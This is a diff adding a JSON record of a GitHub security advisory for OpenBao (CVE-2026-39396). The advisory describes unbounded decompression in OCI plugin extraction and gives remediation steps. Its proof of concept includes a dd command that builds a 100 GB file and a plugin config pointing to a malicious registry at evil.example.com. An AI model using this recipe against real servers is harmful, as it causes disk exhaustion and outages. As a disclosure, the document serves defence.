@@ -1,0 +1,52 @@
+{
+  "global": null,
+  "id": "GHSA-r65v-xgwc-g56j",
+  "repo": {
+    "cve_id": "CVE-2026-39396",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 3.1,
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:N/A:L"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-400",
+      "CWE-674",
+      "CWE-770"
+    ],
+    "description": "### Summary\r\n\r\n`ExtractPluginFromImage()` in OpenBao's OCI plugin downloader extracts a plugin binary from a container image by streaming decompressed tar data via `io.Copy` with no upper bound on the number of bytes written.\r\nAn attacker who controls or compromises the OCI registry referenced in the victim's configuration can serve a crafted image containing a decompression bomb that decompresses to an arbitrarily large file.\r\n\r\nThe SHA256 integrity check occurs after the full file is written to disk, meaning the hash mismatch is detected only after the damage (disk exhaustion) has already occurred. This allow the attacker to replace **legit plugin image** with no need to change its signature.\r\n\r\n### Details\r\n\r\n#### Root cause\r\n\r\n`helper/pluginutil/oci/downloader.go:301`:\r\n\r\n```go\r\nif _, copyErr := io.Copy(outFile, tarReader); copyErr != nil {\r\n```\r\n\r\n`io.Copy()` reads until EOF with no size limit.  \r\nThe tar `header.Size` field is never validated before the copy, and `mutate.Extract` decompresses all gzip layers in memory/streaming, resulting in unbounded decompression-to-disk.\r\n\r\n### PoC\r\n\r\n1. Set up a malicious OCI registry\r\n2. Create a decompression bomb binary:\r\n   ```bash\r\n   dd if=/dev/zero bs=1G count=100 > /tmp/bomb-binary\r\n   ```\r\n3. Package it in a minimal OCI image\r\n4. Push to the malicious registry\r\n5. Configure victim OpenBao to use this registry:\r\n   ```hcl\r\n   plugin \"secrets\" \"bomb\" {\r\n     image       = \"evil.example.com/plugin\"\r\n     version     = \"v1.0.0\"\r\n     binary_name = \"openbao-plugin-secrets-bomb\"\r\n     sha256sum   = \"0000000000000000000000000000000000000000000000000000000000000000\"\r\n   }\r\n   plugin_auto_download = true\r\n   ```\r\n6. Start OpenBao (or trigger SIGHUP), load OCI image, disk fill -> cause DoS\r\n\r\n### Impact\r\n\r\n- Denial of Service: Disk exhaustion on the OpenBao server\r\n- Cascading failure: Co-located services (databases, other apps) also fail when the disk is full\r\n- Difficult recovery: If the process is killed mid-extraction, the partial file remains on disk and is not cleaned up\r\n- Repeated exploitation: On SIGHUP or restart with plugin_auto_download = true, the bomb is re-downloaded\r\n\r\n### Remediation\r\n\r\n1. Validate `header.Size` against a configurable maximum before opening the output file\r\n2. Wrap `tarReader` in `io.LimitReader(tarReader, maxSize+1)` and check bytes written after copy\r\n3. Add a max_size configuration field to PluginConfig for operator control (default: 1 GiB)\r\n",
+    "ghsa_id": "GHSA-r65v-xgwc-g56j",
+    "html_url": "https://github.com/openbao/openbao/security/advisories/GHSA-r65v-xgwc-g56j",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-r65v-xgwc-g56j"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-39396"
+      }
+    ],
+    "published_at": "2026-04-20T23:14:00Z",
+    "references": [],
+    "severity": "low",
+    "summary": "Decompression Bomb via Unbounded Copy in OCI Plugin Extraction (DoS)",
+    "updated_at": "2026-04-20T23:14:00Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/openbao/openbao"
+        },
+        "patched_versions": "2.5.3",
+        "vulnerable_version_range": "<=2.5.2"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "openbao/openbao"
+}
